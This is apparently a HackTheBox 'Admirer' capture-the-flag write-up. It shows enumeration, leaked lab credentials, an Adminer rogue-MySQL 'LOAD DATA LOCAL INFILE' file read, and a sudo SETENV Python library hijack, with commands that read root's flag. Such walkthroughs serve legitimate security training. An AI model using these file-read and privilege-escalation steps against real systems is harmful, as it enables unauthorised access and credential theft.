---
title: HackTheBox - Admirer
date: 2021-01-16 14:32:38 +0100
categories: [Hackthebox walkthroughs, Linux, Easy]
tags: [htb-linux-easy, gobuster, ftp, Adminer, MariaDB, MySQL, python module hijacking, writeup, oscp-prep]
image: https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/Admirer.png
---

## Foothold

### `nmap` scan

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Admirer-full-port-scan.txt 10.10.10.187

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

`nmap` points out that there is an entry in `robots.txt` (on port 80) which is `/admin-dir`. 

### HTTP (port 80)

```bash
$ gobuster dir -u http://$IP -w /usr/share/dirb/wordlists/common.txt
/assets (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
```

- `robots.txt`:

![robots.txt](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/80-robots.png)

**waldo** is a potential user. 

#### `/admin-dir`

![admin dir](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/80-admin-dir.png)

Thanks to `gobuster`, we can see that there are two hidden files `contacts.txt` and `.txt` in `/admin-dir`.

```bash
$ gobuster dir -u http://$TARGET/admin-dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x .txt,.php
/contacts.txt (Status: 200)
/credentials.txt (Status: 200)
```

- `contacts.txt`:

![admin dir](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/80-admin-dir-contacts.png)

6 potential users:

- penny wise
- rajesh nayyar
- amy bialik
- leonard galecki
- howard helberg
- bernadette rauch

- `credentials.txt`:

![admin dir](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/80-admin-dir-credentials.png)

Now we have some useful credentials:
- **Internal mail account**:
    + username &rarr; w.cooper@admirer.htb
    + password &rarr; fgJr6q#S\W:$P

- **FTP account**:
    + username &rarr; ftpuser
    + password &rarr; %n?4Wz}R$tTF7

- **Wordpress account**:
    + username &rarr; admin
    + password &rarr; w0rdpr3ss01!


### FTP (port 21)

```bash
$ ftp $TARGET
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:root): ftpuser
331 Please specify the password.
Password: %n?4Wz}R$tTF7
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
ftp> get dump.sql
local: dump.sql remote: dump.sql
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
226 Transfer complete.
3405 bytes received in 0.00 secs (1.0795 MB/s)
ftp> get html.tar.gz
local: html.tar.gz remote: html.tar.gz
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
226 Transfer complete.
5270987 bytes received in 10.05 secs (512.4245 kB/s)
```

We retrieved two files:
1. `dump.sql`
2. `html.tar.gz`

`html.tar.gz` looks like the source code of the website except that `/admin-dir` is replaced by `/w4ld0s_s3cr3t_d1r`. Besides, there is a folder called `utility-scripts`:

![utility-scripts](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/21-html.png)

Additional credentials can be found in `utility-scripts/db_admin.php`:

- **username**: waldo
- **password**: Wh3r3_1s_w4ld0?

![db_admin.php](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/21-html-db-admin.png)


### Adminer

We can run three types of requests. I wanted to remove one of the `disabled` attribute in order to see what happens next: 

![rm disabled attribute](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/rm-disabled.png)

This error message appeared:

![Need privileges](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/Insufficient.png)

We need some privileges, maybe we have a log in page. so I ran `gobuster` against `/utility-scripts`:

```bash
$ gobuster dir -u http://$TARGET/utility-scripts/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x .txt,.php -s 200
/adminer.php (Status: 200)
/info.php (Status: 200)
/phptest.php (Status: 200)
```

Indeed, there is **Adminer** running on [http://10.10.10.187/utility-scripts/adminer.php](http://10.10.10.187/utility-scripts/adminer.php):

![Adminer](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/80-adminer.png)

Unfortunately, we cannot log in even when using credentials we gathered so far. 

I looked for _"adminer 4.6.2 vuln"_ and _"adminer 4.6.2 exploit"_ and I found this [article about a serious vulnerability discovered in Adminer](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool) affecting version v4.6.2:

![google search](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/google.png)

![article](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/article.png)

#### Setting up MySQL

Since we can specify MySQl Server's IP address, let's run MySQL on our machine:

1. Ensure you have already installed `mariadb`, otherwise install it:

```bash
$ dpkg -l | grep mariadb
# if no output, install it via:
# apt install mariadb-server-<LAST_VERSION> mariadb-client-<LAST_VERSION>
```

2. Connect to MySQL and create a user dedicated to it:

```sql
$ mysql -u root
MariaDB [(none)]> CREATE USER '<USERNAME>'@'10.10.10.187' IDENTIFIED BY'<YOUR PASSWORD>';
Query OK, 0 rows affected (0.001 sec)

```

> The IP address is set to `10.10.10.187` because we want to enable target HTB machine to connect to our Database.  

> Put a password strong enough so that other HTB users cannot guess it quickly and connect to our database. You can use `pwgen` command to generate passwords.

3. Create a temporary Database:

```sql
MariaDB [(none)]> CREATE DATABASE <TEMP_DB_NAME>;
Query OK, 1 row affected (0.000 sec)
```

4. Grant all privileges to your new user on this temporary database:

```sql
MariaDB [(none)]> GRANT ALL PRIVILEGES ON <TEMP_DB_NAME>.* TO <USERNAME>@'10.10.10.187';
Query OK, 0 rows affected (0.001 sec)
```

5. Edit `/etc/mysql/mariadb.conf.d/50-server.cnf` and change `bind-address` address to your HTB IP:

```
bind-address    = <HTB_IP>
```

6. (Re)start service:

```bash
$ systemctl restart mariadb
```

You're now connected:

![connected to MySQL](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/connected.png)

> As you can see, I named my temporary database `TEMPDB` and I'm connected to my HTB private IP `10.10.14.6`.

#### Exploit

In order to perform a similar exploit as in the article [video](https://play.vidyard.com/2v2dccGr2NKWrXsVzkNn8w?disable_popouts=1&v=4.2.27&viral_sharing=0&embed_button=0&hide_playlist=1&color=FFFFFF&playlist_color=FFFFFF&play_button_color=2A2A2A&gdpr_enabled=1&type=inline&new_player_ui=1&autoplay=0&loop=0&muted=0&hidden_controls=0), we have to create a table by clicking on "Create table" link on the left of the page.

However there is no such file as `app/etc/local.xml` as we can see:

![Can't find file](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/error-file.png)

Let's be creative. What about `/etc/passwd`:

![Unable to open file](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/error-permission.png)

Arg! Let's try `admin_tasks.php` since we are in the same directory:

```sql
LOAD DATA LOCAL INFILE 'admin_tasks.php'
INTO TABLE TEMPDB.backup
FIELDS TERMINATED BY "\n"
```

![query success](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/query-success.png)

Bu there is nothing interesting:

![admin_tasks.php in SQL table](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/arg.png)

Looking at `../index.php`, we can see there are new credentials:

```sql
LOAD DATA LOCAL INFILE '../index.php'
INTO TABLE TEMPDB.backup
FIELDS TERMINATED BY "\n"
```

![new creds](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/new-pass.png)

- **username**: `waldo`
- **password**: `&<h5b~yK3F#{PaPB&dA}{H>`

Using these credentials we can log in to ssh:

![ssh](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/admirer/ssh.png)

## User (`waldo`)

```bash
waldo@admirer:~$ cat user.txt 
2cf909ef8117cf88a7793227946a8fff
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
waldo@admirer:~$ 
```

`SETENV` means when we execute `sudo` we can set environment variables. 

Let's take a look at `admin_tasks.sh`:

```bash
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}



# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi


# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0
```

In `backup_web` function the script is calling a python script `/opt/scripts/backup.py`:

```python
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

## Root

Due to the `SETENV` misconfiguration in `sudo`, we can hijack `shutil` Python's library and create a malicious function called `make_archive`:

```bash
$ printf "def make_archive(a, b, c):\n\twith open('/root/root.txt', 'r') as rootPass:\n\t\twith open('/dev/shm/.solve', 'w') as solution:\n\t\t\tsolution.write(rootPass.read())\n" > /dev/shm/shutil.py

$ cat /dev/shm/shutil.py
def make_archive(a, b, c):
        with open('/root/root.txt', 'r') as rootPass:
                with open('/dev/shm/.solve', 'w') as solution:
                        solution.write(rootPass.read())

$ sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...

$ cat /dev/shm/.solve
c7b1d296e8986080b28e0e73bb14c232
```
___

## Useful links

- [Serious Vulnerability Discovered in Adminer database Administration Tool](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)
- [SQL.sh](https://sql.sh/)